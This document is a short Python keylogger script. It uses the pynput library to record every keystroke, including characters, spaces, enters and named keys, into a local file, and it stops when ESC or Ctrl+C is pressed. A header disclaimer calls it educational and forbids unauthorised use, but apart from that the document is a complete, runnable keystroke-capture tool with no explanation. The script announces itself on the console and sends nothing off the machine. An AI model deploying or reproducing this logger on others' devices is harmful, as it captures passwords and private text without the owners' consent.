"""
⚠️ DISCLAIMER:
This keylogger script is developed for educational purposes only.
Do NOT use this script on any device you do not own or without explicit
permission from the device owner. Unauthorized use is illegal and unethical.
"""

from pynput import keyboard

log_file = "keylog.txt"
listener = None  

def on_press(key):
    global listener

    try:
        with open(log_file, "a") as file:
            if hasattr(key, 'char') and key.char is not None:
                file.write(key.char)
            elif key == keyboard.Key.space:
                file.write(" ")
            elif key == keyboard.Key.enter:
                file.write("\n")
            else:
                file.write(f"[{key.name}]")

        # Stop the keylogger if ESC is pressed
        if key == keyboard.Key.esc:
            print("\n ESC pressed. Stopping keylogger.")
            listener.stop()

    except Exception as e:
        print(" Error writing to log:", e)

def main():
    global listener

    print("=== Keylogger Started ===")
    print("Logging keys... Press ESC or Ctrl+C to stop.\n")

    try:
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        listener.join()
    except KeyboardInterrupt:
        print("\n Ctrl+C pressed. Exiting keylogger.")
        try:
            listener.stop()
        except:
            pass

if __name__ == "__main__":
    main()
